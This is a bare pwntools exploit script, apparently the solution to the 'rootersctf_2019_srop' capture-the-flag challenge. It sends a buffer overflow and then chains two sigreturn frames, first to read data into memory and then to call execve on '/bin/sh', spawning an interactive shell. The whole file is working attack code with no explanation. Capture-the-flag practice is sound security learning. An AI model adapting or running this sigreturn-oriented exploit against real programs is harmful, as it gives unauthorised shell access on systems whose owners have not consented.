from pwn import *
context.arch = 'amd64'
context.log_level = 'debug'
r = process('./rootersctf_2019_srop')

pop_rax_syscall = 0x401032

syscall = 0x401033
suig=SigreturnFrame()
suig.rax = 0
suig.rdi = 0
suig.rsi = 0x402000
suig.rdx = 0x100
suig.rip = syscall
suig.rbp=0x402000+0x20

sig2=SigreturnFrame()
sig2.rax = 59
sig2.rdi = 0x402000
sig2.rsi = 0
sig2.rdx = 0
sig2.rip = 0x401033

r.recvuntil("Hey, can i get some feedback for the CTF?\n")
payload=b'a'*0x88+p64(pop_rax_syscall)+p64(0xf)+bytes(suig)
r.sendline(payload)
sleep(1)
r.sendline(b'/bin/sh\x00'+b'a'*0x20+p64(pop_rax_syscall)+p64(0xf)+bytes(sig2))
r.interactive()